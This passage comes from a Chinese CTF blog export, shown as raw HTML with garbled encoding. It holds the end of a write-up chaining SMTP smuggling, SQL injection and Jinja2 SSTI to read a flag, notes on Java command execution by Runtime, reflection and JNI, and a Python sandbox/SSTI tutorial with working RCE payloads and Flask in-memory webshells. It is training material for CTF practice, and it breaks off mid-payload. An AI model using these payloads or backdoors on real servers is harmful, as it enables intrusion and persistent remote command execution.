class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">or</span> parsed_url.hostname != <span class="hljs-string">&#x27;ezmail.org&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SSRF Attack!&quot;</span><br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/report&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report</span>():<br>    message = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        url = request.form[<span class="hljs-string">&quot;url&quot;</span>]<br>        content = request.form[<span class="hljs-string">&quot;content&quot;</span>]<br>        smtplib._quote_periods = <span class="hljs-keyword">lambda</span> x: x<br>        mail_content = <span class="hljs-string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            server = smtplib.SMTP(<span class="hljs-string">&quot;ezmail.org&quot;</span>)<br>            mail_content = smtplib._fix_eols(mail_content)<br>            mail_content = mail_content.<span class="hljs-built_in">format</span>(url=url, content=content)<br>            server.sendmail(<span class="hljs-string">&quot;ignored@ezmail.org&quot;</span>, <span class="hljs-string">&quot;admin@ezmail.org&quot;</span>, mail_content)<br>            message = <span class="hljs-string">&quot;Submitted! Now wait till the end of the world.&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            message = <span class="hljs-string">&quot;Send FAILED&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;report.html&quot;</span>, message=message)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/bot&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bot</span>():<br>    requests.get(<span class="hljs-string">&quot;http://ezmail.org:3000/admin&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The admin is checking your advice(maybe)&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;127.0.0.1&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden IP&quot;</span><br>    subject = get_subjects(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;p@ssword&quot;</span>)<br>    <span class="hljs-keyword">if</span> subject.startswith(<span class="hljs-string">&quot;http://ezmail.org&quot;</span>):<br>        page_content = fetch_page_content(subject)<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span><br><span class="hljs-string">                &lt;div&gt;<span class="hljs-subst">&#123;page_content&#125;</span>&lt;/div&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/news&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">news</span>():<br>    news_id = request.args.get(<span class="hljs-string">&quot;id&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> news_id:<br>        news_id = <span class="hljs-number">1</span><br><br>    conn = sqlite3.connect(<span class="hljs-string">&quot;news.db&quot;</span>)<br>    cursor = conn.cursor()<br><br>    cursor.execute(<span class="hljs-string">f&quot;SELECT title FROM news WHERE id = <span class="hljs-subst">&#123;news_id&#125;</span>&quot;</span>)<br>    result = cursor.fetchone()<br>    conn.close()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Page not found.&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> result[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>smtplib._quote_periods &#x3D; lambda x: xè¢«é­”æ”¹äº†ï¼Œæ— æ³•è½¬ä¹‰.</p><p>æ‰€ä»¥.ç»“æŸåå†ä¼ªé€ ä¸€å°é‚®ä»¶SMTP Smuggling</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;content<span class="hljs-operator">=</span>a<br>.<br>MAIL FROM:&lt;admin<span class="hljs-title">@ezmail.org</span>&gt;<br>RCPT TO:&lt;admin<span class="hljs-title">@ezmail.org</span>&gt;<br>DATA<br>From: admin<span class="hljs-title">@ezmail.org</span><br>To: admin<span class="hljs-title">@ezmail.org</span><br>Subject: http://ezmail.org:<span class="hljs-number">3000</span>/news?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>&#x27;<span class="hljs-variable">%7</span>B<span class="hljs-variable">%7</span>B<span class="hljs-variable">%20</span>self.__init__.__globals__.__builtins__.__import__(<span class="hljs-variable">%22</span>os<span class="hljs-variable">%22</span>).popen(<span class="hljs-variable">%22</span>mkdir<span class="hljs-variable">%20</span>static<span class="hljs-comment">;cat%20/flag%20&gt;static/1%22).read()%20%7D%7D&#x27;</span><br><br>a<br>.<br>QUIT<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</title>
    <link href="/2025/03/20/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/20/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ"><a href="#javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ"></a>javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</h1><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p><img src="/2025/03/20/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image.png"></p><p>å°±ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œæ˜¯privateçš„ï¼Œåªèƒ½åœ¨Runtimeç±»ä¸­å®ä¾‹åŒ–ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨é™æ€æ–¹æ³•getRuntimeè·å–åˆ°Runtimeå¯¹è±¡ï¼Œé€šè¿‡Runtimeå¯¹è±¡çš„æ–¹æ³•execæ‰§è¡Œå‘½ä»¤</p><p>execè¿”å›ä¸€ä¸ªProcesså¯¹è±¡</p><p>è°ƒç”¨é“¾ï¼ˆwindowsï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec() </span><br><span class="line">-&gt;ProcessBuilder.start()</span><br><span class="line">-&gt; ProcessImpl.start() </span><br><span class="line">     -&gt; <span class="keyword">new</span> <span class="title class_">ProcessImpl</span>()</span><br><span class="line">    <span class="comment">//éƒ½åœ¨java.langä¸‹</span></span><br></pre></td></tr></table></figure><p>linuxæ˜¯å°†ProcessImplçš„startæ¢æˆforkAndExec</p><p>Runtime.execç›´æ¥æ‰§è¡Œï¼Œæˆ–åœ¨jdk8ä»¥ä¸‹åå°„æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;ls&quot;</span>).getInputStream()));</span><br><span class="line"><span class="comment">//éœ€è¦æ·»åŠ åº“org.apache.commons.io</span></span><br></pre></td></tr></table></figure><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p>ç±»è·Ÿæ–¹æ³•startéƒ½æ˜¯publicçš„ï¼Œç›´æ¥ç”¨ï¼Œä¹Ÿæ˜¯è¿”å›Processå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;whoami&quot;</span>).start().getInputStream()));</span><br></pre></td></tr></table></figure><h3 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h3><p>ç±»æ˜¯defaultæƒé™ï¼Œåªèƒ½åœ¨java8ä»¥ä¸‹åå°„è·å–ï¼Œå¹¶è°ƒç”¨staticçš„start</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(e.getInputStream()));</span><br></pre></td></tr></table></figure><h3 id="Jniå‘½ä»¤æ‰§è¡Œ"><a href="#Jniå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Jniå‘½ä»¤æ‰§è¡Œ"></a>Jniå‘½ä»¤æ‰§è¡Œ</h3><p>javaä¸­nativeæ–¹æ³•æ˜¯åº•å±‚c&#x2F;c++å®ç°çš„ï¼ˆjniå°±æ˜¯javaä¸c&#x2F;c++åœ°å±‚äº¤æµçš„apiï¼‰</p><p>è‡ªå·±ç¼–å†™nativeæ–¹æ³•æµ‹è¯•</p><p>åˆ›å»ºtest2.java</p><p>javaæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">nativeMethod</span><span class="params">(String str)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.load(<span class="string">&quot;D:\\download\\untitled1\\test\\cmd.dll&quot;</span>); <span class="comment">//ä½ æœ€åçš„dllç”Ÿæˆçš„ä½ç½®ï¼Œæˆ–è€…ä½ ç›´æ¥å°†dllä¸¢æ‰java.library.path</span></span><br><span class="line">        System.out.println(test2.nativeMethod(<span class="string">&quot;ls / -al&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">cp</span> . test2.java -h .  //-hé€‰é¡¹ç”¨æ¥åœ¨æŒ‡å®šç›®å½•ç”Ÿæˆtest_test2.h</span><br></pre></td></tr></table></figure><p>ç¼–å†™test_test2.cpp</p><p>javaä¸c&#x2F;c++é€šä¿¡å‚è€ƒï¼ˆ<a href="https://blog.csdn.net/qq_25722767/article/details/52557235%EF%BC%89">https://blog.csdn.net/qq_25722767/article/details/52557235ï¼‰</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by tiand on 2025-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">#include <span class="string">&quot;test_test2.h&quot;</span></span><br><span class="line">#include &lt;string&gt; </span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_test_test2_nativeMethod</span><span class="params">(JNIEnv *env, jclass jclass, jstring str)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (str == NULL) &#123;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const <span class="type">char</span> *c_str = env-&gt;GetStringUTFChars(str, NULL);</span><br><span class="line">    <span class="keyword">if</span> (c_str == NULL) &#123;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *fp = popen(c_str, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(str, c_str);  <span class="comment">// é‡Šæ”¾ä¼ å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp == NULL) &#123;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string output;  <span class="comment">// å®šä¹‰ string å­˜å‚¨å®Œæ•´çš„è¾“å‡º</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, sizeof(buffer), fp) != NULL) &#123;</span><br><span class="line">        output += buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(output.c_str());  <span class="comment">// è¿”å›å®Œæ•´çš„å¤šè¡Œå­—ç¬¦ä¸²</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å‘½ä»¤</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ -shared -o <span class="built_in">cmd</span>.dll test_test2.cpp -I&quot;<span class="variable">%JAVA_HOME%</span>/include&quot; -I&quot;<span class="variable">%JAVA_HOME%</span>/include/win32&quot; -static -static-libgcc -static-libstdc++ -Wl,--add-stdcall-alias</span><br><span class="line"></span><br><span class="line">#-staticå°½é‡é™æ€ç¼–è¯‘</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonæ²™ç®±ä¸sstiå…¥é—¨</title>
    <link href="/2025/03/11/python%E6%B2%99%E7%AE%B1%E4%B8%8Essti%E5%85%A5%E9%97%A8/"/>
    <url>/2025/03/11/python%E6%B2%99%E7%AE%B1%E4%B8%8Essti%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="pythonæ²™ç®±ä¸ssti-jinja2-å…¥é—¨â€”â€”ç²¾ç®€ç‰ˆ"><a href="#pythonæ²™ç®±ä¸ssti-jinja2-å…¥é—¨â€”â€”ç²¾ç®€ç‰ˆ" class="headerlink" title="pythonæ²™ç®±ä¸ssti(jinja2)å…¥é—¨â€”â€”ç²¾ç®€ç‰ˆ"></a>pythonæ²™ç®±ä¸ssti(jinja2)å…¥é—¨â€”â€”ç²¾ç®€ç‰ˆ</h1><p>å®Œæ•´ç‰ˆäº‘æ–‡æ¡£: <a href="https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&version=4.1.32.6005&platform=win">https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&amp;version=4.1.32.6005&amp;platform=win</a></p><p>é¢˜ç›®ç»ƒä¹ åœºï¼š<a href="https://ctf.xidian.edu.cn/training/">https://ctf.xidian.edu.cn/training/</a></p><h2 id="pythonæ²™ç®±"><a href="#pythonæ²™ç®±" class="headerlink" title="pythonæ²™ç®±"></a>pythonæ²™ç®±</h2><p>æ²™ç®±ç¯å¢ƒæ˜¯é€šè¿‡æ§åˆ¶å’Œé™åˆ¶ä»£ç çš„æ‰§è¡Œï¼Œä¿æŠ¤ç³»ç»Ÿå…å—æ¶æ„ä»£ç çš„å±å®³ã€‚åœ¨ Flask åº”ç”¨ä¸­ï¼Œå¯èƒ½ä¼šé€šè¿‡å¦‚ <code>exec()</code>ã€<code>eval()</code> æˆ–è€…å…¶ä»–åŠ¨æ€æ‰§è¡Œä»£ç çš„æ–¹å¼åˆ›å»ºæ²™ç®±ã€‚è¿™æ ·çš„æ“ä½œå¯èƒ½ä½¿å¾—æ¶æ„ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡æ³¨å…¥ä»£ç è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ã€‚</p><h3 id="é¢˜ç›®ï¼špythonæ²™ç®±1"><a href="#é¢˜ç›®ï¼špythonæ²™ç®±1" class="headerlink" title="é¢˜ç›®ï¼špythonæ²™ç®±1"></a>é¢˜ç›®ï¼špythonæ²™ç®±1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rce&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="built_in">exec</span>(code) <span class="comment">#æ¢æˆeval()å‘¢ï¼Ÿ</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rce.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ€è€ƒï¼šè¦æ˜¯æ²¡æœ‰staticç›®å½•ï¼Œæ€ä¹ˆåŠï¼Ÿ</span></span><br></pre></td></tr></table></figure><p>æ²™ç®±é‡Œæœ‰globals()çš„å…¨å±€å˜é‡ä¸å‡½æ•°</p><h4 id="1-å†™é™æ€ç›®å½•"><a href="#1-å†™é™æ€ç›®å½•" class="headerlink" title="1.å†™é™æ€ç›®å½•"></a>1.å†™é™æ€ç›®å½•</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os;os.system(<span class="string">&#x27;ls &gt;static/1&#x27;</span>) </span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;&#x27;</span>)<span class="comment">#evalæ—¶é€‚ç”¨</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Fifker</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;static/test.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(os.popen(<span class="string">&#x27;dir&#x27;</span>).read())</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡staticä¼šå†™å…¥å¤±è´¥ï¼Œè¿™æ—¶å€™å¯ä»¥å…ˆ <code>mkdir static ; ls &gt;static/1.txt</code></p><h4 id="2-å†™templates-rce-htmlæ¨¡æ¿æ–‡ä»¶"><a href="#2-å†™templates-rce-htmlæ¨¡æ¿æ–‡ä»¶" class="headerlink" title="2.å†™templates&#x2F;rce.htmlæ¨¡æ¿æ–‡ä»¶"></a>2.å†™templates&#x2F;rce.htmlæ¨¡æ¿æ–‡ä»¶</h4><h4 id="3-å†™app-pyçƒ­åŠ è½½"><a href="#3-å†™app-pyçƒ­åŠ è½½" class="headerlink" title="3.å†™app.pyçƒ­åŠ è½½"></a>3.å†™app.pyçƒ­åŠ è½½</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&quot;sed -i \&quot;s/rce.html/`cat /f*`/\&quot; rce.py&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="4-æ‰“å†…å­˜é©¬"><a href="#4-æ‰“å†…å­˜é©¬" class="headerlink" title="4.æ‰“å†…å­˜é©¬"></a>4.æ‰“å†…å­˜é©¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app._got_first_request=<span class="literal">False</span>;app.add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shel1&#x27;</span>,<span class="keyword">lambda</span>:<span class="string">&#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read()))</span><br><span class="line"></span><br><span class="line">app.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x: y <span class="keyword">if</span> <span class="built_in">exec</span>(<span class="string">&#x27;import os;global y;y=make_response(os.popen(&quot;dir&quot;).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> x)</span><br></pre></td></tr></table></figure><h4 id="5-åˆ©ç”¨æ²™ç®±ä¸­å‡½æ•°çš„-globals-å±æ€§è·å–-builtins"><a href="#5-åˆ©ç”¨æ²™ç®±ä¸­å‡½æ•°çš„-globals-å±æ€§è·å–-builtins" class="headerlink" title="5.åˆ©ç”¨æ²™ç®±ä¸­å‡½æ•°çš„__globals__å±æ€§è·å–__builtins__"></a>5.åˆ©ç”¨æ²™ç®±ä¸­å‡½æ•°çš„__globals__å±æ€§è·å–__builtins__</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ur1_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages,lipsum.......</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ur1_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None,[])append(lambda resp:CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import __(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;))read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:ur1_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:ur1_for.__g1obals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><h4 id="6-åˆ©ç”¨ç»§æ‰¿å…³ç³»é€ƒé€¸"><a href="#6-åˆ©ç”¨ç»§æ‰¿å…³ç³»é€ƒé€¸" class="headerlink" title="6.åˆ©ç”¨ç»§æ‰¿å…³ç³»é€ƒé€¸"></a>6.åˆ©ç”¨ç»§æ‰¿å…³ç³»é€ƒé€¸</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    c+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(i.__init__):</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">       <span class="comment">#æ‰¾éwrapperçš„initå‡½æ•°</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span 